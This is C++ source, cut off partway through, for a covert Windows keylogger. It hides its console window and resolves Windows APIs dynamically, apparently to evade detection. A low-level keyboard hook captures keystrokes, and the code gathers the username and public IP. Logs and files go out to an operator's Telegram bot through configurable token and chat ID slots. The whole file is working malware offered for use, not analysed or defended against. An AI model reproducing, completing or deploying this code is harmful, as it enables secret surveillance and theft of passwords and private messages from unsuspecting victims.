#define _WIN32_WINNT 0x0A00 // Target Windows 10+
#define NOMINMAX
#include <windows.h>
#include <winhttp.h> // Using WinHTTP for network requests
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <mutex>
#include <iomanip>
#include <objbase.h> // For CoInitializeEx, CoCreateGuid
#include <rpcdce.h>  // For GUID functions
#include <lmcons.h>  // For UNLEN
#include <algorithm> 
#include <random>    

// Link winhttp.lib (required for WinHTTP)
#pragma comment(lib, "winhttp.lib") 

// --- User Configuration: CRITICAL - REPLACE THESE ---
// Paste your actual Bot Token string directly here
const std::string BOT_TOKEN_PLAINTEXT = "YOUR_BOT_TOKEN_HERE"; 
// Paste your actual Chat ID string directly here
const std::string CHAT_ID_PLAINTEXT = "YOUR_CHAT_ID_HERE";     
// --- End User Configuration ---

// Globals
std::string g_uniqueID; 
std::string g_keystrokeBuffer;
std::mutex g_bufferMutex_keystrokes; 
HHOOK g_keyboardHook = NULL;

// --- Function Pointer Typedefs ---
// WinHTTP Functions
typedef HINTERNET (WINAPI *pWinHttpOpen_type)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *pWinHttpConnect_type)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *pWinHttpOpenRequest_type)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI *pWinHttpSendRequest_type)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pWinHttpReceiveResponse_type)(HINTERNET, LPVOID);
typedef BOOL (WINAPI *pWinHttpQueryHeaders_type)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpQueryDataAvailable_type)(HINTERNET, LPDWORD);
typedef BOOL (WINAPI *pWinHttpReadData_type)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpCloseHandle_type)(HINTERNET);

// Other Windows API Functions
typedef BOOL (WINAPI *pGetUserNameA_type)(LPSTR, LPDWORD);
typedef HHOOK (WINAPI *pSetWindowsHookExA_type)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL (WINAPI *pUnhookWindowsHookEx_type)(HHOOK);
typedef LRESULT (WINAPI *pCallNextHookEx_type)(HHOOK, int, WPARAM, LPARAM);
typedef HMODULE (WINAPI *pGetModuleHandleA_type)(LPCSTR);
typedef BOOL (WINAPI *pGetKeyboardState_type)(PBYTE);
typedef UINT (WINAPI *pMapVirtualKeyA_type)(UINT, UINT);
typedef SHORT (WINAPI *pGetAsyncKeyState_type)(int);
typedef SHORT (WINAPI *pGetKeyState_type)(int);
typedef BOOL (WINAPI *pDeleteFileA_type)(LPCSTR);
typedef DWORD (WINAPI *pGetTempPathA_type)(DWORD, LPSTR);
typedef BOOL (WINAPI *pIsDebuggerPresent_type)(VOID);
typedef HRESULT (WINAPI *pCoInitializeEx_type)(LPVOID, DWORD); 
typedef HRESULT (WINAPI *pCoCreateGuid_type)(GUID*);
typedef RPC_STATUS (WINAPI *pUuidToStringA_type)(const GUID*, RPC_CSTR*);
typedef RPC_STATUS (WINAPI *pRpcStringFreeA_type)(RPC_CSTR*);
typedef HWND (WINAPI *pGetConsoleWindow_type)(VOID);
typedef BOOL (WINAPI *pShowWindow_type)(HWND, int);
typedef BOOL (WINAPI *pGetMessageA_type)(LPMSG, HWND, UINT, UINT);
typedef BOOL (WINAPI *pTranslateMessage_type)(const MSG*);
typedef LRESULT (WINAPI *pDispatchMessageA_type)(const MSG*);
typedef VOID (WINAPI* pSleep_type)(DWORD);

// --- Global Function Pointers ---
pWinHttpOpen_type           fnWinHttpOpen = NULL;
pWinHttpConnect_type        fnWinHttpConnect = NULL;
pWinHttpOpenRequest_type    fnWinHttpOpenRequest = NULL;
pWinHttpSendRequest_type    fnWinHttpSendRequest = NULL;
pWinHttpReceiveResponse_type fnWinHttpReceiveResponse = NULL;
pWinHttpQueryHeaders_type   fnWinHttpQueryHeaders = NULL;
pWinHttpQueryDataAvailable_type fnWinHttpQueryDataAvailable = NULL;
pWinHttpReadData_type       fnWinHttpReadData = NULL;
pWinHttpCloseHandle_type    fnWinHttpCloseHandle = NULL;
pGetUserNameA_type           fnGetUserNameA = NULL;
pSetWindowsHookExA_type      fnSetWindowsHookExA = NULL;
pUnhookWindowsHookEx_type    fnUnhookWindowsHookEx = NULL;
pCallNextHookEx_type         fnCallNextHookEx = NULL;
pGetModuleHandleA_type       fnGetModuleHandleA = NULL;
pGetKeyboardState_type       fnGetKeyboardState = NULL;
pMapVirtualKeyA_type         fnMapVirtualKeyA = NULL;
pGetAsyncKeyState_type       fnGetAsyncKeyState = NULL;
pGetKeyState_type            fnGetKeyState = NULL;
pDeleteFileA_type            fnDeleteFileA = NULL;
pGetTempPathA_type           fnGetTempPathA = NULL;
pIsDebuggerPresent_type      fnIsDebuggerPresent = NULL;
pCoInitializeEx_type         fnCoInitializeEx = NULL; 
pCoCreateGuid_type           fnCoCreateGuid = NULL;
pUuidToStringA_type          fnUuidToStringA = NULL;
pRpcStringFreeA_type         fnRpcStringFreeA = NULL;
pGetConsoleWindow_type       fnGetConsoleWindow = NULL;
pShowWindow_type             fnShowWindow = NULL;
pGetMessageA_type            fnGetMessageA = NULL;
pTranslateMessage_type       fnTranslateMessage = NULL;
pDispatchMessageA_type       fnDispatchMessageA = NULL;
pSleep_type                  fnSleep = NULL;


// Wide string conversion helper
std::wstring s2ws(const std::string& s) {
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0); 
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

// PLAIN TEXT FUNCTION NAMES (for GetProcAddress)
const char str_fn_GetUserNameA[] = "GetUserNameA";
const char str_fn_SetWindowsHookExA[] = "SetWindowsHookExA";
const char str_fn_UnhookWindowsHookEx[] = "UnhookWindowsHookEx";
const char str_fn_CallNextHookEx[] = "CallNextHookEx";
const char str_fn_GetModuleHandleA[] = "GetModuleHandleA";
const char str_fn_GetKeyboardState[] = "GetKeyboardState";
const char str_fn_MapVirtualKeyA[] = "MapVirtualKeyA";
const char str_fn_GetAsyncKeyState[] = "GetAsyncKeyState";
const char str_fn_GetKeyState[] = "GetKeyState";
const char str_fn_DeleteFileA[] = "DeleteFileA";
const char str_fn_GetTempPathA[] = "GetTempPathA";
const char str_fn_IsDebuggerPresent[] = "IsDebuggerPresent";
const char str_fn_CoInitializeEx[] = "CoInitializeEx"; 
const char str_fn_CoCreateGuid[] = "CoCreateGuid";
const char str_fn_UuidToStringA[] = "UuidToStringA";
const char str_fn_RpcStringFreeA[] = "RpcStringFreeA";
const char str_fn_GetConsoleWindow[] = "GetConsoleWindow";
const char str_fn_ShowWindow[] = "ShowWindow";
const char str_fn_GetMessageA[] = "GetMessageA";
const char str_fn_TranslateMessage[] = "TranslateMessage";
const char str_fn_DispatchMessageA[] = "DispatchMessageA";
const char str_fn_Sleep[] = "Sleep"; 
// WinHTTP Functions
const char str_fn_WinHttpOpen[] = "WinHttpOpen";
const char str_fn_WinHttpConnect[] = "WinHttpConnect";
const char str_fn_WinHttpOpenRequest[] = "WinHttpOpenRequest";
const char str_fn_WinHttpSendRequest[] = "WinHttpSendRequest";
const char str_fn_WinHttpReceiveResponse[] = "WinHttpReceiveResponse";
const char str_fn_WinHttpQueryHeaders[] = "WinHttpQueryHeaders";
const char str_fn_WinHttpQueryDataAvailable[] = "WinHttpQueryDataAvailable";
const char str_fn_WinHttpReadData[] = "WinHttpReadData";
const char str_fn_WinHttpCloseHandle[] = "WinHttpCloseHandle";

// Helper to get function address (no logging in final version)
template<typename T>
T GetAPI(HMODULE hModule, const char* plainFuncName) {
    if (!hModule) return NULL;
    return (T)GetProcAddress(hModule, plainFuncName); 
}

// InitializeAPIs: Loads DLLs directly and gets function pointers directly
bool InitializeAPIs() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll"); 
    if (!hKernel32) return false; 
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) { FreeLibrary(hKernel32); return false; }
    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
    if (!hWinHttp) { FreeLibrary(hKernel32); FreeLibrary(hUser32); return false; }
    HMODULE hOle32 = LoadLibraryA("ole32.dll");
    if (!hOle32) { FreeLibrary(hKernel32); FreeLibrary(hUser32); if(hWinHttp) FreeLibrary(hWinHttp); return false; }
    HMODULE hRpcrt4 = LoadLibraryA("rpcrt4.dll");
    if (!hRpcrt4) { FreeLibrary(hKernel32); FreeLibrary(hUser32); if(hWinHttp) FreeLibrary(hWinHttp); if(hOle32)FreeLibrary(hOle32); return false; }
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll"); 
    if (!hAdvapi32) { FreeLibrary(hKernel32); FreeLibrary(hUser32); if(hWinHttp) FreeLibrary(hWinHttp); if(hOle32)FreeLibrary(hOle32); if(hRpcrt4) FreeLibrary(hRpcrt4); return false; }

    // Assign WinHTTP function pointers
    fnWinHttpOpen = GetAPI<pWinHttpOpen_type>(hWinHttp, str_fn_WinHttpOpen);
    fnWinHttpConnect = GetAPI<pWinHttpConnect_type>(hWinHttp, str_fn_WinHttpConnect);
    fnWinHttpOpenRequest = GetAPI<pWinHttpOpenRequest_type>(hWinHttp, str_fn_WinHttpOpenRequest);
    fnWinHttpSendRequest = GetAPI<pWinHttpSendRequest_type>(hWinHttp, str_fn_WinHttpSendRequest);
    fnWinHttpReceiveResponse = GetAPI<pWinHttpReceiveResponse_type>(hWinHttp, str_fn_WinHttpReceiveResponse);
    fnWinHttpQueryHeaders = GetAPI<pWinHttpQueryHeaders_type>(hWinHttp, str_fn_WinHttpQueryHeaders);
    fnWinHttpQueryDataAvailable = GetAPI<pWinHttpQueryDataAvailable_type>(hWinHttp, str_fn_WinHttpQueryDataAvailable);
    fnWinHttpReadData = GetAPI<pWinHttpReadData_type>(hWinHttp, str_fn_WinHttpReadData);
    fnWinHttpCloseHandle = GetAPI<pWinHttpCloseHandle_type>(hWinHttp, str_fn_WinHttpCloseHandle);

    // Assign other function pointers
    fnSleep = GetAPI<pSleep_type>(hKernel32, str_fn_Sleep); 
    fnGetModuleHandleA = GetAPI<pGetModuleHandleA_type>(hKernel32, str_fn_GetModuleHandleA);
    fnDeleteFileA = GetAPI<pDeleteFileA_type>(hKernel32, str_fn_DeleteFileA);
    fnGetTempPathA = GetAPI<pGetTempPathA_type>(hKernel32, str_fn_GetTempPathA);
    fnIsDebuggerPresent = GetAPI<pIsDebuggerPresent_type>(hKernel32, str_fn_IsDebuggerPresent);
    fnGetConsoleWindow = GetAPI<pGetConsoleWindow_type>(hKernel32, str_fn_GetConsoleWindow);
    fnSetWindowsHookExA = GetAPI<pSetWindowsHookExA_type>(hUser32, str_fn_SetWindowsHookExA);
    fnUnhookWindowsHookEx = GetAPI<pUnhookWindowsHookEx_type>(hUser32, str_fn_UnhookWindowsHookEx);
    fnCallNextHookEx = GetAPI<pCallNextHookEx_type>(hUser32, str_fn_CallNextHookEx);
    fnGetKeyboardState = GetAPI<pGetKeyboardState_type>(hUser32, str_fn_GetKeyboardState);
    fnMapVirtualKeyA = GetAPI<pMapVirtualKeyA_type>(hUser32, str_fn_MapVirtualKeyA);
    fnGetAsyncKeyState = GetAPI<pGetAsyncKeyState_type>(hUser32, str_fn_GetAsyncKeyState);
    fnGetKeyState = GetAPI<pGetKeyState_type>(hUser32, str_fn_GetKeyState);
    fnShowWindow = GetAPI<pShowWindow_type>(hUser32, str_fn_ShowWindow);
    fnGetMessageA = GetAPI<pGetMessageA_type>(hUser32, str_fn_GetMessageA);
    fnTranslateMessage = GetAPI<pTranslateMessage_type>(hUser32, str_fn_TranslateMessage);
    fnDispatchMessageA = GetAPI<pDispatchMessageA_type>(hUser32, str_fn_DispatchMessageA);
    fnGetUserNameA = GetAPI<pGetUserNameA_type>(hAdvapi32, str_fn_GetUserNameA); 
    if (!fnGetUserNameA) { 
        fnGetUserNameA = GetAPI<pGetUserNameA_type>(hKernel32, str_fn_GetUserNameA);
    }
    fnCoInitializeEx = GetAPI<pCoInitializeEx_type>(hOle32, str_fn_CoInitializeEx); 
    fnCoCreateGuid = GetAPI<pCoCreateGuid_type>(hOle32, str_fn_CoCreateGuid);
    fnUuidToStringA = GetAPI<pUuidToStringA_type>(hRpcrt4, str_fn_UuidToStringA);
    fnRpcStringFreeA = GetAPI<pRpcStringFreeA_type>(hRpcrt4, str_fn_RpcStringFreeA);

    // Check if ALL critical pointers were loaded
    bool critical_apis_loaded = 
        fnWinHttpOpen && fnWinHttpConnect && fnWinHttpOpenRequest && fnWinHttpSendRequest && 
        fnWinHttpReceiveResponse && fnWinHttpQueryHeaders && fnWinHttpQueryDataAvailable && 
        fnWinHttpReadData && fnWinHttpCloseHandle &&
        fnGetUserNameA && fnGetModuleHandleA && fnCoInitializeEx && fnCoCreateGuid && 
        fnUuidToStringA && fnRpcStringFreeA && fnSetWindowsHookExA && fnUnhookWindowsHookEx && 
        fnCallNextHookEx && fnGetKeyboardState && fnMapVirtualKeyA && fnGetAsyncKeyState && 
        fnGetKeyState && fnGetMessageA && fnTranslateMessage && fnDispatchMessageA &&
        fnShowWindow && fnGetConsoleWindow && fnDeleteFileA && fnGetTempPathA && fnSleep; 
    
    // Don't FreeLibrary handles here if successful. Only if check fails.
    if (!critical_apis_loaded) {
        if(hAdvapi32) FreeLibrary(hAdvapi32); if(hRpcrt4) FreeLibrary(hRpcrt4); if(hOle32) FreeLibrary(hOle32);
        if(hWinHttp) FreeLibrary(hWinHttp); if(hUser32) FreeLibrary(hUser32); if(hKernel32) FreeLibrary(hKernel32); 
        return false;
    }
    return true; 
}

// --- Function Implementations ---

void HideConsoleWindow() {
    if (fnGetConsoleWindow && fnShowWindow) {
        HWND hWnd = fnGetConsoleWindow();
        if (hWnd) fnShowWindow(hWnd, SW_HIDE);
    }
}

std::string GetCurrentUsername() {
    if (!fnGetUserNameA) return "NoUserFunc"; 
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (fnGetUserNameA(username, &username_len)) {
        return std::string(username);
    }
    return "UserErr"; 
}

std::string GenerateTargetUniqueID() {
    if (!fnCoInitializeEx) return "ID_NoCOM"; 
    if (!fnCoCreateGuid || !fnUuidToStringA || !fnRpcStringFreeA) { 
        auto now = std::chrono::system_clock::now(); 
        auto epoch = now.time_since_epoch(); auto value = std::chrono::duration_cast<std::chrono::milliseconds>(epoch);
        return "ID_NoGUIDFn_" + std::to_string(value.count()); 
    }
    GUID guid;
    HRESULT hr = fnCoCreateGuid(&guid);
    if (hr == S_OK) {
        RPC_CSTR guidStr;
        if (fnUuidToStringA(&guid, &guidStr) == RPC_S_OK) {
            std::string result(reinterpret_cast<char*>(guidStr));
            fnRpcStringFreeA(&guidStr);
            return result;
        } 
    } 
    auto now = std::chrono::system_clock::now(); 
    auto epoch = now.time_since_epoch(); auto value = std::chrono::duration_cast<std::chrono::milliseconds>(epoch);
    return "ID_GUIDErr_" + std::to_string(value.count()); 
}

std::string UrlEncodeString(const std::string &value) { 
    std::ostringstream escaped; escaped.fill('0'); escaped << std::hex;
    for (char c : value) {
        if (isalnum(static_cast<unsigned char>(c)) || c == '-' || c == '_' || c == '.' || c == '~') { escaped << c; } 
        else { escaped << '%' << std::setw(2) << static_cast<int>(static_cast<unsigned char>(c)); }
    } return escaped.str();
}

std::string GenerateRandomAlphanumString(size_t length) { 
    const std::string characters = "abcdefghijklmnopqrstuvwxyz0123456789"; std::random_device random_device;
    std::mt19937 generator(random_device()); std::uniform_int_distribution<> distribution(0, characters.length() - 1);
    std::string random_string; std::generate_n(std::back_inserter(random_string), length, [&]() {
        return characters[distribution(generator)]; }); return random_string;
}

std::string GetTemporaryLogFilePath() {
    if (!fnGetTempPathA) return GenerateRandomAlphanumString(7) + ".log"; 
    char tempPath[MAX_PATH]; DWORD pathLen = fnGetTempPathA(MAX_PATH, tempPath);
    if (pathLen == 0 || pathLen > MAX_PATH) return GenerateRandomAlphanumString(7) + ".log";
    std::string tempDir = tempPath;
    if (!tempDir.empty() && tempDir.back() != '\\') {
        tempDir += '\\';
    }
    return tempDir + GenerateRandomAlphanumString(9) + ".tmp"; 
}

// --- GetPublicIPAddress using WinHTTP ---
std::string GetPublicIPAddress() {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    std::string result = "IPFail"; 
    std::string responseBody;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    char* pszOutBuffer = NULL;

    if (!fnWinHttpOpen || !fnWinHttpConnect || !fnWinHttpOpenRequest || !fnWinHttpSendRequest || 
        !fnWinHttpReceiveResponse || !fnWinHttpQueryDataAvailable || !fnWinHttpReadData || !fnWinHttpCloseHandle) {
        return "NoIPFunc"; 
    }

    // Using wide strings for WinHTTP API where needed
    hSession = fnWinHttpOpen(L"IPGetter/1.1 (WinHTTP)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup_ip; 

    hConnect = fnWinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) goto cleanup_ip; 

    hRequest = fnWinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);             
    if (!hRequest) goto cleanup_ip; 

    bResults = fnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) goto cleanup_ip; 

    bResults = fnWinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) goto cleanup_ip; 
    
    do {
        dwSize = 0;
        if (!fnWinHttpQueryDataAvailable(hRequest, &dwSize)) goto cleanup_ip;
        if (dwSize == 0) break; 
        pszOutBuffer = new (std::nothrow) char[dwSize+1]; 
        if(!pszOutBuffer) goto cleanup_ip;
        ZeroMemory(pszOutBuffer, dwSize+1);
        if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) { delete[] pszOutBuffer; goto cleanup_ip; } 
        responseBody.append(pszOutBuffer, dwDownloaded);
        delete[] pszOutBuffer;
        pszOutBuffer = NULL; 
    } while (dwSize > 0);

    if (!responseBody.empty()) result = responseBody; 
    else result = "IPEmpty"; 

cleanup_ip: 
    if (hRequest) fnWinHttpCloseHandle(hRequest);
    if (hConnect) fnWinHttpCloseHandle(hConnect);
    if (hSession) fnWinHttpCloseHandle(hSession);
    delete[] pszOutBuffer; 

    if (result.find('.') != std::string::npos && result.length() >= 7) return result;
    else if(result == "IPFail" || result == "NoIPFunc" || result == "IPEmpty") return result; 
    else return "IPInvalid"; 
}

// --- SendSimpleTelegramPing using WinHTTP and Plaintext Content ---
bool SendSimpleTelegramPing(const std::string& message) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    bool success = false;
    std::string responseBody;
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    DWORD dwDownloaded = 0;
    char* pszOutBuffer = NULL;

    if (!fnWinHttpOpen || !fnWinHttpConnect || !fnWinHttpOpenRequest || !fnWinHttpSendRequest || 
        !fnWinHttpReceiveResponse || !fnWinHttpQueryDataAvailable || !fnWinHttpReadData || !fnWinHttpCloseHandle || !fnWinHttpQueryHeaders) {
        return false; 
    }
    if (BOT_TOKEN_PLAINTEXT.empty() || CHAT_ID_PLAINTEXT.empty()) { 
        return false; 
    }

    std::wstring host = L"api.telegram.org"; 
    std::string path_base = "/bot" + BOT_TOKEN_PLAINTEXT + "/sendMessage?chat_id=" + CHAT_ID_PLAINTEXT + "&text=" + UrlEncodeString(message);
    std::wstring path = s2ws(path_base); 

    hSession = fnWinHttpOpen(L"TelegramPing/1.2 (WinHTTP)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); 
    if (!hSession) goto cleanup_ping_plain; 

    hConnect = fnWinHttpConnect(hSession, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) goto cleanup_ping_plain; 

    hRequest = fnWinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE); 
    if (!hRequest) goto cleanup_ping_plain; 

    bResults = fnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) goto cleanup_ping_plain; 

    bResults = fnWinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) goto cleanup_ping_plain; 
    
    dwSize = sizeof(dwStatusCode); // Reset size for query
    fnWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
    
    do {
        dwSize = 0; 
        if (!fnWinHttpQueryDataAvailable(hRequest, &dwSize)) goto cleanup_ping_plain; 
        if (dwSize == 0) break;
        pszOutBuffer = new (std::nothrow) char[dwSize+1];
        if(!pszOutBuffer) goto cleanup_ping_plain;
        ZeroMemory(pszOutBuffer, dwSize+1);
        if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) { delete[] pszOutBuffer; goto cleanup_ping_plain; } 
        responseBody.append(pszOutBuffer, dwDownloaded);
        delete[] pszOutBuffer;
        pszOutBuffer = NULL;
    } while (dwSize > 0);

    if (responseBody.find("\"ok\":true") != std::string::npos) {
        success = true;
    } 

cleanup_ping_plain: 
    if (hRequest) fnWinHttpCloseHandle(hRequest);
    if (hConnect) fnWinHttpCloseHandle(hConnect);
    if (hSession) fnWinHttpCloseHandle(hSession);
    delete[] pszOutBuffer; 
    return success;
}

// SendMsgToTelegram calls the ping function
bool SendMsgToTelegram(const std::string& message) { 
    return SendSimpleTelegramPing(message); 
}

// --- SendFileToTelegram using WinHTTP and Plaintext Content ---
bool SendFileToTelegram(const std::string& filePath, const std::string& caption) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    bool success = false;
    std::string responseBody;
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    DWORD dwDownloaded = 0;
    char* pszOutBuffer = NULL;
    std::wstring wContentTypeHeader; 

    if (!fnWinHttpOpen || !fnWinHttpConnect || !fnWinHttpOpenRequest || !fnWinHttpSendRequest || 
        !fnWinHttpReceiveResponse || !fnWinHttpQueryDataAvailable || !fnWinHttpReadData || !fnWinHttpCloseHandle || !fnWinHttpQueryHeaders) {
         return false;
    }
     if (BOT_TOKEN_PLAINTEXT.empty() || CHAT_ID_PLAINTEXT.empty()) { 
        return false; 
    }

    std::string boundary = "----Boundary" + GenerateRandomAlphanumString(24);
    std::string contentTypeHeader = "Content-Type: multipart/form-data; boundary=" + boundary;
    wContentTypeHeader = s2ws(contentTypeHeader); 
    std::stringstream bodyStream;

    bodyStream << "--" << boundary << "\r\n" << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" << CHAT_ID_PLAINTEXT << "\r\n";
    if (!caption.empty()) { bodyStream << "--" << boundary << "\r\n" << "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" << caption << "\r\n"; }
    
    std::ifstream file(filePath, std::ios::binary | std::ios::ate); 
    if (!file.is_open()) return false; 
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg); 
    std::vector<char> fileBuffer(fileSize);
    if (!file.read(fileBuffer.data(), fileSize)) { file.close(); return false; }
    file.close();

    std::string justFileName = filePath.substr(filePath.find_last_of("/\\") + 1);
    bodyStream << "--" << boundary << "\r\n" << "Content-Disposition: form-data; name=\"document\"; filename=\"" << justFileName << "\"\r\n"
               << "Content-Type: application/octet-stream\r\n\r\n";
    bodyStream.write(fileBuffer.data(), fileSize);
    bodyStream << "\r\n"; 
    bodyStream << "--" << boundary << "--\r\n";
    
    std::string requestBodyStr = bodyStream.str();
    DWORD dwRequestBodySize = requestBodyStr.length();

    std::wstring host = L"api.telegram.org";
    std::string path_base = "/bot" + BOT_TOKEN_PLAINTEXT + "/sendDocument"; 
    std::wstring path = s2ws(path_base);

    std::string agent_file = "TGFileUploader/1.2 (WinHTTP)"; 
    hSession = fnWinHttpOpen(s2ws(agent_file).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup_file_plain; 

    hConnect = fnWinHttpConnect(hSession, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) goto cleanup_file_plain; 

    hRequest = fnWinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) goto cleanup_file_plain; 

    bResults = fnWinHttpSendRequest(hRequest, wContentTypeHeader.c_str(), (DWORD)-1L, (LPVOID)requestBodyStr.c_str(), dwRequestBodySize, dwRequestBodySize, 0);
    if (!bResults) goto cleanup_file_plain; 

    bResults = fnWinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) goto cleanup_file_plain; 

    dwSize = sizeof(dwStatusCode); // Reset size for query
    fnWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
    
    do {
        dwSize = 0; 
        if (!fnWinHttpQueryDataAvailable(hRequest, &dwSize)) goto cleanup_file_plain; 
        if (dwSize == 0) break;
        pszOutBuffer = new (std::nothrow) char[dwSize+1];
        if(!pszOutBuffer) goto cleanup_file_plain;
        ZeroMemory(pszOutBuffer, dwSize+1);
        if (!fnWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) { delete[] pszOutBuffer; goto cleanup_file_plain; } 
        responseBody.append(pszOutBuffer, dwDownloaded);
        delete[] pszOutBuffer;
        pszOutBuffer = NULL;
    } while (dwSize > 0);

    if (responseBody.find("\"ok\":true") != std::string::npos) {
        success = true;
    } 

cleanup_file_plain: 
    if (hRequest) fnWinHttpCloseHandle(hRequest);
    if (hConnect) fnWinHttpCloseHandle(hConnect);
    if (hSession) fnWinHttpCloseHandle(hSession);
    delete[] pszOutBuffer; 
    return success;
}

// --- LowLevelKeyboardProc unchanged ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { 
    if (!fnCallNextHookEx || !fnGetKeyboardState || !fnGetAsyncKeyState || !fnGetKeyState || !fnMapVirtualKeyA) {
         return CallNextHookEx(NULL, nCode, wParam, lParam); 
    } if (nCode == HC_ACTION) { KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) { std::string keyStroke; BYTE keyboardState[256];
            fnGetKeyboardState(keyboardState); bool isShiftPressed = (fnGetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool isCapsLockOn = (fnGetKeyState(VK_CAPITAL) & 0x0001) != 0; bool makeUpperCase = (isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn);
            switch (pkbhs->vkCode) { 
                case VK_RETURN: keyStroke = "[ENTER]\n"; break; case VK_BACK: keyStroke = "[BACKSPACE]"; break;
                case VK_TAB: keyStroke = "[TAB]"; break; case VK_SPACE: keyStroke = " "; break;
                case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: keyStroke = ""; break; 
                case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: keyStroke = ""; break; 
                case VK_MENU: case VK_LMENU: case VK_RMENU: keyStroke = ""; break; 
                case VK_CAPITAL: keyStroke = "[CAPSLOCK]"; break; case VK_ESCAPE: keyStroke = "[ESC]"; break;
                case VK_PRIOR: keyStroke = "[PAGEUP]"; break; case VK_NEXT: keyStroke = "[PAGEDOWN]"; break;
                case VK_END: keyStroke = "[END]"; break; case VK_HOME: keyStroke = "[HOME]"; break;
                case VK_LEFT: keyStroke = "[LEFT]"; break; case VK_UP: keyStroke = "[UP]"; break;
                case VK_RIGHT: keyStroke = "[RIGHT]"; break; case VK_DOWN: keyStroke = "[DOWN]"; break;
                case VK_INSERT: keyStroke = "[INSERT]"; break; case VK_DELETE: keyStroke = "[DELETE]"; break;
                case VK_LWIN: case VK_RWIN: keyStroke = "[WIN]"; break;
                case VK_F1: keyStroke = "[F1]"; break; case VK_F2: keyStroke = "[F2]"; break; case VK_F3: keyStroke = "[F3]"; break;
                case VK_F4: keyStroke = "[F4]"; break; case VK_F5: keyStroke = "[F5]"; break; case VK_F6: keyStroke = "[F6]"; break;
                case VK_F7: keyStroke = "[F7]"; break; case VK_F8: keyStroke = "[F8]"; break; case VK_F9: keyStroke = "[F9]"; break;
